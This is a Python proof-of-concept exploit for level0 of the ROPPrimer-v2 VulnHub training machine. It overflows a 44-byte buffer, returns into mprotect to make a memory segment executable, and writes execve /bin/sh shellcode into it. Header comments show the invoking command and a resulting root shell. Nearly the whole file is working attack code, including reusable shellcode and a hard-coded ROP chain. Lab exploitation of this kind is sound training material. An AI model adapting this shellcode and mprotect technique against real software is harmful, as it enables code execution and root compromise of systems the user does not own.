# level0 from ROPPrimer-v2 on vulnhub PoC
# By @Pink_P4nther <pinkp4nther@protonmail.com>
# ASLR disabled
# NX on
# Exploit
# (python poc.py;echo " ";cat) | ./level0
# root@pinksploit:~/ROPprimerv2/level0# (python poc.py;echo " ";cat) | ./level0
# [+] ROP tutorial level0
# [+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�A���!
# id
# uid=0(root) gid=0(root) groups=0(root)

import sys
import struct

# $1 = {<text variable, no debug info>} 0x80523e0 <mprotect>
# address of shellcode 0xb7ffa041

# shellcode address in mapped segment
# My machine: 0xb7ffa041
# ROPPrimer machine: 0xb7ffd041
SHELLCODE = 0xb7ffd041
# mapped memory segment start
# My machine: 0xb7ffa000
# ROPPrimer machine: 0xb7ffd000
MAPPED = 0xb7ffd000

# little endian converter
def le(x):
    return struct.pack("<L",x)

# exec /bin/sh
shellcode = (
            "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
            "\xc9\x89\xca\x6a\x0b\x58\xcd\x80")

# Buffer
buf = ""
buf += "A"*44 # offset

# mprotect call change mapped segment to rwx
buf += le(0x80523e0) # address of mprotect call
buf += le(SHELLCODE) # address of shellcode
buf += le(MAPPED) # address of mapped memory segment
buf += le(0x100000) # amount of memory to change privs
buf += le(0x7) # PROT_READ | PROT_WRITE | PROT_EXEC

sys.stdout.write(buf + "\n" + shellcode) # write buffer into mapped segment
